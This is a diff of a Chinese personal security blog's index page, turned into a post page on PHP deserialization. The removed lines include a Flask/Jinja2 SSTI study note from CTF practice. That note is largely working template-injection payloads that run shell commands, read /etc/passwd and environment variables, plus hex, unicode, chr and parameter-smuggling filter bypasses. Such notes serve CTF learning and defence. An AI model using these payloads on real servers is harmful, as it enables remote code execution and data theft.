@@ -20,30 +20,34 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="欢迎光临，我的朋友">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Ed3n&#39;s Blog">
-<meta property="og:url" content="http://example.com/index.html">
+  <meta name="description" content="php反序列化前置代码条件：$this-&gt;$this在oop(面向对象编程)中是伪变量，是对一个对象示例的引用。伪变量不是真正的变量，形式上是变量。变量中存储的是固定的值，$this中并没有，哪个对象调用，$this就代表哪个对象， 也可以将$this理解为对象的引用，通过引用的方式访问一个对象的方法和属性。 &lt;?php echo $this-&gt;tpl_id?&gt;中($thi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化学习记录">
+<meta property="og:url" content="http://example.com/2024/03/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="Ed3n&#39;s Blog">
-<meta property="og:description" content="欢迎光临，我的朋友">
+<meta property="og:description" content="php反序列化前置代码条件：$this-&gt;$this在oop(面向对象编程)中是伪变量，是对一个对象示例的引用。伪变量不是真正的变量，形式上是变量。变量中存储的是固定的值，$this中并没有，哪个对象调用，$this就代表哪个对象， 也可以将$this理解为对象的引用，通过引用的方式访问一个对象的方法和属性。 &lt;?php echo $this-&gt;tpl_id?&gt;中($thi">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-03-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-09T06:53:26.370Z">
 <meta property="article:author" content="Ed3n">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="unserialization">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/">
+<link rel="canonical" href="http://example.com/2024/03/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>Ed3n's Blog</title>
+  <title>php反序列化学习记录 | Ed3n's Blog</title>
   
 
 
@@ -146,228 +150,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/09/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Ed3n">
-      <meta itemprop="description" content="欢迎光临，我的朋友">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ed3n's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/03/09/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-03-09 09:28:03" itemprop="dateCreated datePublished" datetime="2024-03-09T09:28:03+08:00">2024-03-09</time>
-            </span>
-
-          
-
-        </div>
-      </header>
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/09/Jinja2%20SSTI/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Ed3n">
-      <meta itemprop="description" content="欢迎光临，我的朋友">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ed3n's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/03/09/Jinja2%20SSTI/" class="post-title-link" itemprop="url">Flask Jinja2 SSTI学习记录</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-03-09 00:00:00 / 修改时间：14:53:35" itemprop="dateCreated datePublished" datetime="2024-03-09T00:00:00+08:00">2024-03-09</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/SSTI/" itemprop="url" rel="index"><span itemprop="name">SSTI</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Flask-Jinja2"><a href="#Flask-Jinja2" class="headerlink" title="Flask Jinja2"></a>Flask Jinja2</h1><p>flask是使用Jinja2来作为渲染引擎的，模板文件并不是单纯的html代码，而是夹杂着模板的语法，因</p>
-<p>为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。</p>
-<p>flask的渲染方法有render_template和render_template_string两种。</p>
-<p>感觉…没什么好多说的，就是记模板</p>
-<h2 id="模板和过滤（前提：以GET给name传参）"><a href="#模板和过滤（前提：以GET给name传参）" class="headerlink" title="模板和过滤（前提：以GET给name传参）"></a>模板和过滤（前提：以GET给name传参）</h2><h3 id="通用（并不是每一个题目都有以下几类）"><a href="#通用（并不是每一个题目都有以下几类）" class="headerlink" title="通用（并不是每一个题目都有以下几类）"></a>通用（并不是每一个题目都有以下几类）</h3><h4 id=""><a href="#" class="headerlink" title="&lt;class os.wrap_close&gt;"></a><code>&lt;class os.wrap_close&gt;</code></h4><h5 id="popen"><a href="#popen" class="headerlink" title="popen"></a><code>popen</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&quot;popen&quot;](&quot;ls /&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>讲述一些小细节：</p>
-<ul>
-<li><p><code>__bases__</code>后面的数字是根据实际情况，以<strong>object</strong>类出现的位数而定的（一般是<code>__bases__</code>为0，<code>__mro__</code>为1）</p>
-</li>
-<li><p><code>__subclasses__</code>后面的数字是根据实际情况，以<strong>os.wrap_close</strong>出现的位数而定的</p>
-</li>
-</ul>
-<p>直接读文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__.get(&#x27;popen&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a><code>__builtins__</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__.__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这个类有个<strong>eval</strong>内置方法就可以执行命令</p>
-<p>这里有个坑，就是在执行命令的时候不能用<strong>system</strong>函数</p>
-<p>因为在flask里面执行system的时候返回的是状态码，也就是看不到回显，只会回显一些数字，所以要用popen，而且最好16进制编码一下，不然容易触发黑名单，还能避免很多大大小小的错误</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(&#x27;__builtins__&#x27;).get(&#x27;open&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br><span class="line">//get()方式绕过</span><br></pre></td></tr></table></figure>
-
-<h5 id="sys"><a href="#sys" class="headerlink" title="sys"></a><code>sys</code></h5><p>听说有用，目前还没见到</p>
-<h4 id="-1"><a href="#-1" class="headerlink" title="&lt;type &#39;file&#39;&gt; "></a><code>&lt;type &#39;file&#39;&gt; </code></h4><p>读取文件类，&lt;type ‘file’&gt; file位置一般为40，直接调用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="-2"><a href="#-2" class="headerlink" title="&lt;class &#39;site._Printer&#39;&gt;"></a><code>&lt;class &#39;site._Printer&#39;&gt;</code></h4><p>调用<code>os</code>的<code>popen</code>执行命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /flasklight&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;cat coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果system被过滤，用os的listdir读取目录+file模块读取文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="-3"><a href="#-3" class="headerlink" title="&lt;class &#39;subprocess.Popen&#39;&gt;"></a><code>&lt;class &#39;subprocess.Popen&#39;&gt;</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;ls /flasklight&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">//读环境变量</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[245](&#x27;env&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="-4"><a href="#-4" class="headerlink" title="&lt;class &#39;warnings.catch_warnings&#39;&gt;"></a><code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#调用file</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line">#把 read() 改为 write() 就是写文件</span><br><span class="line">#调用eval</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">#调用system方法</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.values()[144](&#x27;whoami&#x27;)&#125;&#125;</span><br><span class="line">#调用commands进行命令执行</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__bases__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls /&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤_"></a>过滤<code>_</code></h4><h5 id="引号内十六进制绕过"><a href="#引号内十六进制绕过" class="headerlink" title="引号内十六进制绕过"></a>引号内十六进制绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__ &#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.&quot;\x5f\x5fclass\x5f\x5f&quot; &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>_</code>是<code>\x5f</code>，<code>.</code>是<code>\x2E</code></p>
-<h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤[]"></a>过滤<code>[]</code></h4><h5 id="getitem"><a href="#getitem" class="headerlink" title="__getitem__()"></a><code>__getitem__()</code></h5><p><code>d[&#39;a&#39;]</code> 等价于<code>d.__getitem__(&#39;a&#39;)</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__.__getitem__(&#x27;0&#x27;).__subclasses__().__getitem__(&#x27;138&#x27;).__init__.__globals__[&quot;popen&quot;](&quot;ls /&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="pop"><a href="#pop" class="headerlink" title="pop()"></a><code>pop()</code></h5><p><code>d[&#39;a&#39;]</code> 等价于<code>d.pop(&#39;a&#39;)</code></p>
-<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><h5 id="单双引号互换"><a href="#单双引号互换" class="headerlink" title="单双引号互换"></a>单双引号互换</h5><h5 id="http-get（用GET方式传入）"><a href="#http-get（用GET方式传入）" class="headerlink" title="http_get（用GET方式传入）"></a>http_get（用GET方式传入）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(&#x27;popen&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>等价于</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(request.args.func)(request.args.cmd).read()&#125;&#125;&amp;func=popen&amp;cmd=dir</span><br></pre></td></tr></table></figure>
-
-<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><h5 id="拼接关键字绕过"><a href="#拼接关键字绕过" class="headerlink" title="拼接关键字绕过"></a>拼接关键字绕过</h5><h6 id="引号内拼接"><a href="#引号内拼接" class="headerlink" title="引号内拼接"></a>引号内拼接</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1]&#125;&#125;</span><br><span class="line">等价于</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;&#x27;lass__&#x27;][&#x27;__m&#x27;&#x27;ro__&#x27;][1]&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;+&#x27;lass__&#x27;][&#x27;__m&#x27;+&#x27;ro__&#x27;][1]&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;~&#x27;lass__&#x27;][&#x27;__m&#x27;~&#x27;ro__&#x27;][1]&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>参考payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;[&#x27;__cla&#x27;&#x27;ss__&#x27;][&#x27;__bas&#x27;&#x27;es__&#x27;][0][&#x27;__subcl&#x27;&#x27;asses__&#x27;]()[117][&#x27;__in&#x27;&#x27;it__&#x27;].__globals__[&#x27;po&#x27;&#x27;pen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h6 id="attr"><a href="#attr" class="headerlink" title="attr()"></a><code>attr()</code></h6><p>这个比较特殊</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__&#125;&#125;</span><br><span class="line">等价于</span><br><span class="line">&#123;&#123;&#x27;&#x27;|attr(&#x27;__cl&#x27;&#x27;ass__&#x27;)|attr(&#x27;__ba&#x27;&#x27;se__&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)&#125;&#125; //unicode绕过</span><br></pre></td></tr></table></figure>
-
-<p>参考payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%print&quot;&quot;|attr(&quot;__cla&quot;&quot;ss__&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)|attr(&quot;__subc&quot;&quot;lasses__&quot;)()|attr(138)|attr(&quot;__in&quot;&quot;it__&quot;)|attr(&quot;__glo&quot;&quot;bals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)%&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里注意一下，其中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;__builtins__&#x27;]</span><br><span class="line">应当是</span><br><span class="line">|attr(&quot;get&quot;)(&quot;__builtins__&quot;)</span><br><span class="line">而不仅仅是|attr(&quot;__builtins__&quot;)</span><br><span class="line">[&quot;eval&quot;]同理</span><br></pre></td></tr></table></figure>
-
-<p>unicode绕过参考payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()|attr(138)|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u006c\u0073\u0020\u002f\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;)&#125;&#125;</span><br><span class="line">//这里是ls /</span><br></pre></td></tr></table></figure>
-
-<p>当然，<code>attr()</code>用<code>[]</code>代替也可以，但是完全替代就出不来了…</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%print(((((((((&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;))()|attr(140))|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u006c\u0073\u0020\u002f\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;))%&#125;</span><br></pre></td></tr></table></figure>
-
-<p>以上是盲注的写法</p>
-<h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p><strong>base64</strong></p>
-<p>成功率有点低就是了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__class__</span><br><span class="line">等价于</span><br><span class="line">__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;))</span><br></pre></td></tr></table></figure>
-
-<p><strong>chr</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;|attr(&quot;__cla&quot;&quot;ss__&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)|attr(&quot;__subc&quot;&quot;lasses__&quot;)()|attr(10)|attr(&quot;__in&quot;&quot;it__&quot;)|attr(&quot;__glo&quot;&quot;bals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))&quot;)&#125;&#125;</span><br><span class="line">//这里不是ls /！！</span><br></pre></td></tr></table></figure>
-
-<h5 id="http-get"><a href="#http-get" class="headerlink" title="http_get"></a>http_get</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;|attr(request.args.cla)|attr(request.args.bas)|attr(request.args.sub)().pop(138)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.geti)(request.args.bui)|attr(request.args.geti)(request.args.ii)(request.args.hh)&#125;&#125;&amp;cla=__class__&amp;bas=__bases__&amp;sub=__subclasses__&amp;ini=__init__&amp;glo=__globals__&amp;bui=__builtins__&amp;hh=__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&amp;ii=eval&amp;geti=__getitem__</span><br></pre></td></tr></table></figure>
-
-<p>写一个16进制编码的payload</p>
